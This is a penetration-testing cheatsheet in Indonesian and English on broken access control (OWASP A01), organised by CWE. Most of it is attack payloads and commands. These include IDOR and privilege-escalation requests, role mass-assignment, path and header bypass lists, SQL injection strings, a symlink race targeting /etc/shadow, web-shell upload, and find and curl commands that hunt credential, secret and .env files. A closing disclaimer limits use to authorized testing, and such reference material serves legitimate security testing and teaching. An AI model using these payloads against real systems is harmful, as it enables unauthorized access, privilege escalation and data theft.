# 🔓 BROKEN ACCESS CONTROL CHEATSHEET — Part 06B

## OWASP A01:2021 — Authorization, IDOR, Information Exposure, Permissions

---

## 📑 Table of Contents (06B)
1. [CWE-284/285/862/863: Access Control & Authorization](#cwe-284285862863-access-control--authorization)
2. [CWE-639: IDOR (Authorization Bypass via User-Controlled Key)](#cwe-639-idor)
3. [CWE-566: Auth Bypass via SQL Primary Key](#cwe-566-auth-bypass-via-sql-primary-key)
4. [CWE-200/201/359/497: Information Exposure](#cwe-200201359497-information-exposure)
5. [CWE-219/538/540/548/552/615: Sensitive Data in Files](#cwe-219538540548552615-sensitive-data-in-files)
6. [CWE-276/281/282/283/732: Permissions Issues](#cwe-276281282283732-permissions-issues)
7. [CWE-377/379: Insecure Temp Files](#cwe-377379-insecure-temp-files)
8. [CWE-402/668/922: Resource Leak & Wrong Sphere](#cwe-402668922-resource-leak--wrong-sphere)
9. [CWE-424: Alternate Path Bypass](#cwe-424-alternate-path-bypass)
10. [CWE-749: Exposed Dangerous Method](#cwe-749-exposed-dangerous-method)
11. [CWE-1275: Insecure SameSite Cookie](#cwe-1275-insecure-samesite-cookie)

---

# CWE-284/285/862/863: Access Control & Authorization

**Deskripsi**: Missing atau incorrect access control — user bisa mengakses resources/actions tanpa authorization yang benar.

## Detection

```bash
# Autorize (Burp Extension) — BEST TOOL
# 1. Install Autorize dari BApp Store
# 2. Login sebagai low-privilege user, copy cookie
# 3. Paste cookie di Autorize
# 4. Browse sebagai admin
# 5. Autorize otomatis replay setiap request dengan low-priv cookie
# 6. Bandingkan: hijau = enforced, merah = BYPASSED

# Manual Testing Checklist:
# 1. Horizontal: User A → akses data User B?
# 2. Vertical: Regular user → akses admin endpoint?
# 3. Unauthenticated: No token → akses protected endpoint?
```

## Payloads & Techniques

```bash
# ===== VERTICAL PRIVILEGE ESCALATION =====
# Ubah role di request
POST /api/update-profile HTTP/1.1
{"name":"test","role":"admin"}           # Tambah role field
{"name":"test","isAdmin":true}           # Boolean flag
{"name":"test","privilege_level":9999}   # Numeric level
{"name":"test","group_id":1}             # Admin group

# Akses admin endpoint dengan user token
GET /admin/users HTTP/1.1
Authorization: Bearer USER_TOKEN

GET /api/admin/delete-user/123 HTTP/1.1
Cookie: session=regular_user_session

# ===== HORIZONTAL PRIVILEGE ESCALATION =====
# Ganti ID di URL
GET /api/users/1001/profile              # Your profile
GET /api/users/1002/profile              # Other user's profile
GET /api/users/1003/profile              # Another user

# Ganti ID di body
POST /api/transfer
{"from_account":"YOUR_ID","to_account":"ATTACKER","amount":1000}
# Change from_account to victim's ID

# ===== METHOD TAMPERING =====
# Bypass method restriction
GET /admin/delete-user/123      # 403 Forbidden
POST /admin/delete-user/123     # Maybe works?
PUT /admin/delete-user/123      # Try all methods
DELETE /admin/delete-user/123
PATCH /admin/delete-user/123
OPTIONS /admin/delete-user/123  # Check allowed methods

# ===== PATH BYPASS =====
/admin                          # 403
/Admin                          # Case change
/ADMIN
/admin/                         # Trailing slash
/admin/.                        # Dot
/admin/..;/admin                # Path traversal
//admin                         # Double slash
/./admin                        # Dot slash
/admin%20                       # Space
/admin%09                       # Tab
/admin;                         # Semicolon
/admin.json                     # Extension
/admin.html
/%61%64%6d%69%6e                # URL encode "admin"

# ===== HEADER BYPASS =====
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: localhost
X-Real-IP: 127.0.0.1
```

## Tools

```bash
# Autorize (Burp) — otomatis test auth bypass
# AuthMatrix (Burp) — matrix-based authorization testing
# Auth Analyzer (Burp) — analyze auth mechanisms

# Nuclei
nuclei -u https://target.com -tags auth-bypass,idor

# Manual: Burp Repeater + compare responses
```

---

# CWE-639: IDOR

**Deskripsi**: Insecure Direct Object Reference — penyerang mengubah user-controlled key (ID) untuk mengakses data milik user lain.

## Detection

```bash
# Manual:
# 1. Login, do normal actions
# 2. Identify object references (IDs, filenames, UUIDs)
# 3. Change ID values → check if you access other user's data

# Burp Intruder: Iterate IDs
# Autorize: Automatic IDOR detection
```

## Payloads

```bash
# ===== NUMERIC ID =====
GET /api/orders/1001          # Your order
GET /api/orders/1002          # Other's order
GET /api/orders/1000          # Iterate backward
GET /api/users/1/invoices     # User 1's invoices

# Burp Intruder: Numbers 1-10000
# Payload type: Numbers, From: 1, To: 10000, Step: 1

# ===== UUID =====
# Predictable UUIDs (v1 = timestamp-based)
GET /api/documents/550e8400-e29b-41d4-a716-446655440000
# Try nearby timestamps:
GET /api/documents/550e8400-e29b-41d4-a716-446655440001

# Leak UUIDs via:
# - API responses listing
# - Error messages
# - HTML source comments
# - JS files
# - Wayback Machine

# ===== FILENAME =====
GET /api/download?file=report_user1001.pdf
GET /api/download?file=report_user1002.pdf
GET /api/attachments/invoice_123.pdf
GET /api/attachments/invoice_124.pdf

# ===== HASHED ID =====
# If ID is MD5/SHA1 of sequential number:
# MD5("1") = c4ca4238a0b923820dcc509a6f75849b
# MD5("2") = c81e728d9d4c2f636f067f89cc14862c
GET /api/users/c4ca4238a0b923820dcc509a6f75849b
GET /api/users/c81e728d9d4c2f636f067f89cc14862c

# ===== PARAMETER POLLUTION =====
GET /api/profile?user_id=1001&user_id=1002
POST /api/profile
user_id=1001&user_id=1002

# ===== JSON BODY =====
# Original
POST /api/update {"id": 1001, "name": "test"}
# IDOR
POST /api/update {"id": 1002, "name": "hacked"}

# ===== GRAPHQL =====
query { user(id: 1002) { name email password } }
query { order(id: "OTHER_UUID") { total items } }

# ===== MASS ASSIGNMENT =====
POST /api/register
{"username":"attacker","email":"a@b.com","role":"admin","id":1}
```

---

# CWE-566: Auth Bypass via SQL Primary Key

**Deskripsi**: Authorization check menggunakan user-controlled SQL primary key → attacker bisa mengakses data orang lain.

```sql
-- Vulnerable query:
-- SELECT * FROM orders WHERE order_id = USER_INPUT AND user_id = CURRENT_USER
-- Attacker manipulates order_id:
-- SELECT * FROM orders WHERE order_id = 999 OR 1=1-- AND user_id = 123

-- Payloads:
999 OR 1=1--
999 OR user_id=456--
999 UNION SELECT * FROM orders WHERE user_id=456--
```

---

# CWE-200/201/359/497: Information Exposure

**Deskripsi**: Aplikasi mengekspos informasi sensitif ke unauthorized actors.

## Detection & Exploitation

```bash
# ===== ERROR MESSAGES (CWE-200) =====
# Trigger errors untuk mendapatkan info
GET /api/users/9999999999      # Non-existent ID
GET /api/users/'               # SQL error
GET /api/users/../../../../    # Path error
POST /api/login {"user":"admin","pass":"x"}  # Auth error

# Informasi dari error:
# - Stack traces (framework, library versions)
# - SQL query structure
# - File paths
# - Internal IP addresses
# - Database names

# ===== DEBUG ENDPOINTS =====
GET /debug
GET /trace
GET /actuator          # Spring Boot
GET /actuator/env
GET /actuator/health
GET /actuator/configprops
GET /actuator/mappings
GET /__debug__         # Django debug
GET /elmah.axd         # .NET error log
GET /server-status     # Apache
GET /server-info       # Apache
GET /phpinfo.php       # PHP
GET /info.php
GET /_profiler         # Symfony
GET /api/debug/vars    # Go

# ===== RESPONSE HEADERS (CWE-497) =====
# Check for info leakage in headers
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
X-AspNet-Version: 4.0.30319
X-Debug-Token: abc123

# ===== SENSITIVE DATA IN RESPONSE (CWE-201/359) =====
# API returning more data than needed
GET /api/users/me
# Response includes: password_hash, SSN, credit_card, internal_notes

# GraphQL introspection
POST /graphql
{"query":"{ __schema { types { name fields { name } } } }"}

# ===== TOOLS =====
# Nuclei
nuclei -u https://target.com -tags exposure,info,misconfig

# Check headers
curl -I https://target.com

# Check response body for sensitive patterns
curl -s https://target.com/api/users | grep -iE "password|token|secret|key|ssn|credit"
```

---

# CWE-219/538/540/548/552/615: Sensitive Data in Files

## CWE-548: Directory Listing

```bash
# Check if directory listing enabled
curl https://target.com/images/
curl https://target.com/uploads/
curl https://target.com/backup/
curl https://target.com/assets/

# Nuclei
nuclei -u https://target.com -tags listing

# Nmap
nmap --script http-enum target.com -p 80,443
```

## CWE-219/538/552: Files Under Web Root

```bash
# Sensitive files accessible from web
/.env
/.env.bak
/.env.local
/.env.production
/config.php
/config.yml
/database.yml
/wp-config.php
/web.config
/.htaccess
/.htpasswd
/robots.txt           # May reveal hidden paths
/sitemap.xml
/crossdomain.xml
/clientaccesspolicy.xml
/.well-known/
/package.json
/composer.json
/Gemfile
/requirements.txt

# Version control
/.git/config
/.git/HEAD
/.git/logs/HEAD
/.svn/entries
/.svn/wc.db
/.hg/
/.bzr/

# Backups
/backup.sql
/backup.tar.gz
/dump.sql
/database.sql
/*.bak
/*.old
/*.swp
/*.swo
/*~
/.bak

# IDE files
/.idea/
/.vscode/
/*.iml

# Tools
# GitTools (extract .git)
git clone https://github.com/internetwache/GitTools.git
./GitTools/Dumper/gitdumper.sh https://target.com/.git/ output_dir

# trufflehog (find secrets in git)
trufflehog git https://github.com/target/repo

# git-secrets
git secrets --scan
```

## CWE-540/615: Secrets in Source Code / Comments

```bash
# Check JS files for secrets
curl -s https://target.com/main.js | grep -iE "api_key|apikey|secret|token|password|auth"

# HTML comments
curl -s https://target.com | grep -E "<!--|-->"

# Common findings:
# - API keys hardcoded in JavaScript
# - TODO comments with credentials
# - Debug code left in production
# - Internal URLs in comments
# - Database connection strings

# Tools
# LinkFinder (extract endpoints from JS)
python linkfinder.py -i https://target.com/main.js -o results.html

# SecretFinder
python SecretFinder.py -i https://target.com/main.js -o results.html

# JSFinder
python JSFinder.py -u https://target.com

# Mantra (secrets in JS)
mantra -u https://target.com
```

---

# CWE-276/281/282/283/732: Permissions Issues

```bash
# ===== LINUX PERMISSION CHECKS =====
# World-readable sensitive files
find / -perm -o+r -type f 2>/dev/null | grep -iE "password|config|secret|key|\.env"

# World-writable files/dirs
find / -perm -o+w -type f 2>/dev/null
find / -perm -o+w -type d 2>/dev/null

# SUID binaries (CWE-732)
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins: https://gtfobins.github.io/

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Files owned by root but writable by others
find / -user root -perm -o+w -type f 2>/dev/null

# Check cron permissions
ls -la /etc/cron*
ls -la /var/spool/cron/

# Writable PATH directories
echo $PATH | tr ':' '\n' | xargs -I {} ls -ld {}

# ===== WEB APP PERMISSIONS =====
# Upload directory executable
# Check if uploaded files can be executed:
upload shell.php → access https://target.com/uploads/shell.php

# Config files readable from web
curl https://target.com/.env
curl https://target.com/wp-config.php

# ===== WINDOWS =====
icacls "C:\important\file.txt"
accesschk.exe -uwqs "Everyone" *
accesschk.exe -uwqs Users *
```

---

# CWE-377/379: Insecure Temp Files

```bash
# ===== CHECK TEMP FILE ISSUES =====
# Predictable temp filenames
ls -la /tmp/
ls -la /var/tmp/

# Race condition: create symlink before app creates temp file
ln -s /etc/shadow /tmp/predicted_tempfile_name

# PHP session files
ls -la /tmp/sess_*
ls -la /var/lib/php/sessions/

# Upload temp files
ls -la /tmp/php*

# World-readable temp files
find /tmp -perm -o+r -type f 2>/dev/null
```

---

# CWE-402/668/922: Resource Leak & Wrong Sphere

```bash
# ===== CWE-402: Resource Leak =====
# Internal data exposed to external sphere
# - Internal APIs accessible from internet
# - Private repos made public
# - Internal docs on public servers

# ===== CWE-668: Exposure to Wrong Sphere =====
# Admin panel accessible from internet
curl https://target.com/admin
curl https://target.com/internal-api
curl https://target.com/management

# Internal services exposed
nmap -sV target.com -p 6379,9200,27017,5432,3306,11211

# ===== CWE-922: Insecure Storage =====
# Sensitive data stored insecurely
# - Passwords in plaintext in DB
# - Secrets in localStorage/sessionStorage
# - API keys in client-side code
# - Credentials in URL parameters (logged in server logs)
# - Sensitive data in browser cache
```

---

# CWE-424: Alternate Path Bypass

```bash
# Bypass access control via alternate paths
# If /admin is blocked:
/Admin
/ADMIN
/%61dmin
/admin/
/admin/.
/admin/..;/
/;/admin
/admin;/
/admin.json
/admin.html
/v1/admin          # API versioning
/api/../admin      # Path traversal
/admin%23          # Fragment
/admin%3F          # Question mark

# API endpoint bypass
/api/v1/users      # Blocked
/api/v2/users      # Different version, maybe no auth
/api/users          # No version prefix
/Users              # Case change
```

---

# CWE-749: Exposed Dangerous Method

```bash
# Dangerous methods/endpoints exposed
PUT /api/users/admin    # Create/modify admin
DELETE /api/users/1     # Delete user
PATCH /api/config       # Modify config

# WebDAV methods
OPTIONS / HTTP/1.1      # Check allowed methods
PROPFIND / HTTP/1.1
MOVE / HTTP/1.1
COPY / HTTP/1.1
MKCOL / HTTP/1.1

# Debug endpoints
GET /api/debug/reset
POST /api/admin/execute
GET /api/test/rce?cmd=id

# GraphQL mutations
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

---

# CWE-1275: Insecure SameSite Cookie

**Deskripsi**: Cookie tanpa/dengan incorrect SameSite attribute → rentan CSRF.

```bash
# ===== CHECK COOKIE ATTRIBUTES =====
curl -I https://target.com/login -c - | grep -i "set-cookie"

# Yang harus dicek:
# Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Strict
#                              ^^^^^^  ^^^^^^^^  ^^^^^^^^^^^^^^^
#                              HTTPS   No JS     CSRF protect

# ===== SAMESITE VALUES =====
# Strict: Cookie TIDAK dikirim pada cross-site requests (paling aman)
# Lax: Cookie dikirim pada top-level GET navigations saja (default)
# None: Cookie selalu dikirim (harus + Secure flag) — rentan CSRF

# ===== VULNERABLE =====
Set-Cookie: session=abc; SameSite=None; Secure    # Rentan CSRF
Set-Cookie: session=abc;                          # No SameSite (Lax default, tapi old browser = None)
Set-Cookie: session=abc; SameSite=Lax             # Rentan pada GET-based CSRF

# ===== SECURE =====
Set-Cookie: session=abc; SameSite=Strict; Secure; HttpOnly; Path=/

# ===== ADDITIONAL COOKIE FLAGS =====
# Missing Secure → cookie sent over HTTP (sniffable)
# Missing HttpOnly → cookie accessible via JavaScript (XSS steal)
# Missing SameSite → CSRF possible
# Domain too broad → cookie shared with subdomains
# Path too broad → cookie sent to all paths

# ===== TOOLS =====
# ZAP passive scanner (auto-detect cookie issues)
# Nuclei
nuclei -u https://target.com -tags cookie

# Manual check
curl -v https://target.com 2>&1 | grep -i "set-cookie"
```

---

## 🔍 Master Detection Pipeline

```bash
# ===== COMPLETE ACCESS CONTROL AUDIT =====

# 1. Collect endpoints
katana -u https://target.com -d 3 -jc | sort -u > endpoints.txt

# 2. Check info exposure
nuclei -l endpoints.txt -tags exposure,info,misconfig -o info_leaks.txt

# 3. Check for sensitive files
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -o sensitive_files.json -of json

# 4. Check directory listings
nuclei -l endpoints.txt -tags listing

# 5. IDOR testing (manual with Autorize Burp extension)

# 6. Auth bypass
nuclei -l endpoints.txt -tags auth-bypass

# 7. SSRF
nuclei -l endpoints.txt -tags ssrf

# 8. Check cookies
curl -sI https://target.com | grep -i "set-cookie"

# 9. Git/SVN exposure
nuclei -l endpoints.txt -tags git,svn
```

---

> ⚠️ **DISCLAIMER**: Semua payloads dan teknik di cheatsheet ini hanya untuk **ethical hacking** dan **penetration testing yang sudah diotorisasi**. Penggunaan tanpa izin merupakan pelanggaran hukum.
